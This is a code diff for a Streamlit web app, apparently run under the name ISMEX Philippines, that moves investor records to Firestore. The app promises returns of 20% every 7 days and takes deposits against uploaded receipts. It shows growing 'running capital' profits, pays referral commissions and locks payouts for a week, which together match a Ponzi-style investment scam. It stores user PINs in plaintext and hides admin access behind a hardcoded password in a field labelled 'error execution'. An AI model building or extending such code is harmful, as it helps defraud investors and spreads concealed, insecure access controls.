@@ -1,23 +1,31 @@
 import streamlit as st
-import json
-import os
+from google.cloud import firestore
+from google.oauth2 import service_account
 from datetime import datetime, timedelta
+import json
 
 # ==========================================
-# BLOCK 1: CORE DATA ENGINE
+# BLOCK 1: CLOUD DATA ENGINE (FIREBASE)
 # ==========================================
+# Connects to your permanent database using the Secrets you saved
+try:
+    creds_info = st.secrets["firebase"]
+    creds = service_account.Credentials.from_service_account_info(creds_info)
+    db = firestore.Client(credentials=creds)
+except Exception as e:
+    st.error("Database connection failed. Check your Streamlit Secrets.")
+
 def load_registry():
-    if os.path.exists("bpsm_registry.json"):
-        try:
-            with open("bpsm_registry.json", "r") as f: return json.load(f)
-        except: return {}
-    return {}
+    try:
+        users_ref = db.collection("investors")
+        docs = users_ref.stream()
+        return {doc.id: doc.to_dict() for doc in docs}
+    except Exception:
+        return {}
 
 def update_user(name, data):
-    reg = load_registry()
-    reg[name] = data
-    with open("bpsm_registry.json", "w") as f: 
-        json.dump(reg, f, indent=4, default=str)
+    # Saves data instantly to Google Cloud - No more data loss
+    db.collection("investors").document(name).set(data)
 
 # State initialization
 if 'page' not in st.session_state: st.session_state.page = "ad"
@@ -121,7 +129,7 @@ elif st.session_state.user:
 
     current_wallet = float(data.get('wallet', 0.0))
 
-    # DEPOSIT FORM
+    # FORMS (DEPOSIT, REINVEST, WITHDRAW)
     if st.session_state.action_type == "DEP":
         with st.form("d"):
             st.markdown("### 📥 DEPOSIT REQUEST")
@@ -135,7 +143,6 @@ elif st.session_state.user:
                     update_user(st.session_state.user, data); st.session_state.action_type = None; st.rerun()
                 else: st.error("Please upload your receipt.")
 
-    # REINVEST FORM
     if st.session_state.action_type == "REIN":
         with st.form("r"):
             st.markdown("### ♻️ REINVEST CAPITAL")
@@ -148,7 +155,6 @@ elif st.session_state.user:
                     update_user(st.session_state.user, data); st.session_state.action_type = None; st.rerun()
                 else: st.error("Invalid amount or insufficient balance.")
 
-    # WITHDRAW FORM
     if st.session_state.action_type == "WITH":
         with st.form("w"):
             st.markdown("### 💸 WITHDRAWAL REQUEST")
@@ -164,7 +170,8 @@ elif st.session_state.user:
                     update_user(st.session_state.user, data); st.session_state.action_type = None; st.rerun()
                 else: st.error("Check balance and fill all details.")
 
-                st.markdown("### 🚀 RUNNING CAPITALS")
+    # RUNNING CAPITALS (WITH 7-DAY LOCK)
+    st.markdown("### 🚀 RUNNING CAPITALS")
     active = data.get('inv', [])
     if not active: 
         st.info("No running capitals.")
@@ -172,18 +179,14 @@ elif st.session_state.user:
         now = datetime.now()
         for idx, a in reversed(list(enumerate(active))):
             start_dt = datetime.fromisoformat(a['start_time'])
-            # EXACT UNLOCK: 7 Days from start
             unlock_dt = start_dt + timedelta(days=7)
             
-            # Progress logic
             total_seconds = 7 * 86400
             elapsed = (now - start_dt).total_seconds()
             progress = min(1.0, elapsed / total_seconds)
             
             total_roi = a['amount'] * 1.20
             live_profit = (a['amount'] * 0.20) * progress
-            
-            # Formatting the display
             unlock_str = unlock_dt.strftime("%b %d, %Y at %I:%M %p")
             
             st.markdown(f"""
@@ -199,17 +202,15 @@ elif st.session_state.user:
             
             st.progress(progress)
             
-            # THE LOCK: Button only works if time has passed
             is_locked = now < unlock_dt
-            if st.button(f"📥 {'LOCKED' if is_locked else 'PULL OUT'} ₱{total_roi:,.2f}", key=f"p_{idx}", disabled=is_locked):
+            btn_label = f"📥 PULL OUT ₱{total_roi:,.2f}" if not is_locked else "🔒 LOCKED"
+            if st.button(btn_label, key=f"p_{idx}", disabled=is_locked):
                 data['wallet'] = data.get('wallet', 0.0) + total_roi
                 data.setdefault('history', []).append({"type": "PULL_OUT", "amount": total_roi, "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "status": "CONFIRMED"})
                 active.pop(idx)
                 update_user(st.session_state.user, data)
                 st.rerun()
-                
-                
-        
+
     st.divider()
     st.markdown("### 🤝 REFERRAL PROGRAM")
     st.code(f"https://twee-gith.github.io/ISMEX-PHILIPPINES/?ref={user_display.replace(' ', '+')}", language="text")
@@ -246,9 +247,11 @@ elif st.session_state.page == "login":
         rn = st.text_input("REFERRAL NAME", value=current_ref).upper().strip()
         if st.button("REGISTER"):
             reg = load_registry()
-            if fn and len(p1) == 6:
-                reg[fn] = {"pin": p1, "wallet": 0.0, "inv": [], "full_name": fn, "referral": rn, "pending_actions": [], "history": [], "commissions": [], "has_deposited": False}
-                update_user(fn, reg[fn]); st.success("Registered! Login now.")
+            if fn in reg:
+                st.error("ACCESS DENIED: Name already exists in Investor Registry.")
+            elif fn and len(p1) == 6:
+                user_data = {"pin": p1, "wallet": 0.0, "inv": [], "full_name": fn, "referral": rn, "pending_actions": [], "history": [], "commissions": [], "has_deposited": False}
+                update_user(fn, user_data); st.success("Registered! Login now.")
 else:
     st.markdown("<h1 style='color: #007BFF;'>INTERNATIONAL STOCK MARKET EXCHANGE! 📊📈</h1>", unsafe_allow_html=True)
     st.write("Grow your capital by 20% every 7 days!")
@@ -257,4 +260,4 @@ else:
     if col_b.button("🚀 PRESS HERE TO REGISTER / LOGIN", use_container_width=True): st.session_state.page = "login"; st.rerun()
     if st.session_state.admin_mode:
         if st.text_input("error execution", type="password") == "0102030405": st.session_state.is_boss = True; st.rerun()
-                
+            
